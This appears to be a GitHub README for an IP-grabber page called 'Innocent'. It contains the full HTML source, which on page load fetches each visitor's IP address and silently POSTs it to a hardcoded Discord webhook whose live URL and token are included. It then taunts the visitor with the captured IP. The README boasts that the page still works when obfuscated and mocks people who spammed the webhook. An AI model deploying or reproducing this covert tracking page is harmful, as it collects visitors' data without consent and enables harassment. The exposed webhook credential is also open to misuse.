EXAMPLE URI: [CLICK HERE](https://hideakiatsuyo.github.io/innocent)

Example Result:<br>
![](https://i.imgur.com/A58wwMd.png)
<br>
For the "big fan" don't send messages on the webhook it's not made for it and just [open an issue](https://github.com/HideakiAtsuyo/innocent/issues/new) if you are just here to troll or something like this (and for the guy with the 8.8.8.8 it's useless too) it just require a few updates to fuck both of you and only receive IP
<br>
It also work when obfuscated:<br>
![](https://i.imgur.com/ZoxHNLh.png)

```html
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <title>Innocent</title>
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
    <script type="application/javascript">
      $(function() {
          		$.getJSON("https://api.ipify.org?format=jsonp&callback=?", //Take the IP then use the callback function 
          			function(json) {//Discord Webhook under
          			const discordWebhook = "https://canary.discord.com/api/webhooks/934415150738464938/oPDmxpKkAUF6lbus2jQcOlsjB8VurxdhoG5Yf8VubLdCSZffJbz53xEEtstjOS7vrXD1"; //USE REDIRECTION NOT DIRECT WEBHOOK LMAO
          			let req = new XMLHttpRequest(); //Initialize The Request
          			req.open("POST", discordWebhook);
          			req.setRequestHeader("Content-Type", "application/json");
          			let payloadRes = { //Payload to send in the request
          				username: "Angel Gabriel",
          				avatar_url: "https://patricia-lasserre.com/wp-content/uploads/2021/06/gabriel-750x500.jpg",
          				content: json.ip //Your IP from the callback
          			};
          			req.send(JSON.stringify(payloadRes)); //Send the request with the payload
      
          			setTimeout(() => {
          				document.write(`<center><img src="https://patricia-lasserre.com/wp-content/uploads/2021/06/gabriel-750x500.jpg"><h1>Did I just caught you on my website ${json.ip} ?</h1></center>`);
          			}, 2*1000); //Wait 2 seconds then write this as new page
          		});
          	});
        
    </script>
  </head>
  <body>
    <center>
      <br>WAIT 2 SECONDS
    </center>
  </body>
</html>
```
